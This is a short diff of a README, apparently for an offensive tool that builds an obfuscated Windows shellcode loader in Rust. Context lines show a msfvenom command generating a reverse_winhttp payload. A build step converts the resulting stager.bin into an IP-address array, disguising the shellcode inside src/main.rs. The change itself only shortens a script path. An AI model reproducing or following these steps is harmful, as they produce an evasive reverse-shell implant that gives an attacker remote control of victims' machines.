@@ -153,7 +153,7 @@ msfvenom -p windows/x64/custom/reverse_winhttp \
 **2. Convert to IP list:**
 
 ```bash
-python3 tools/ipfuscator.py stager.bin
+python3 ipfuscator.py stager.bin
 # Copy the output array into src/main.rs → shellcode_ips
 ```
 
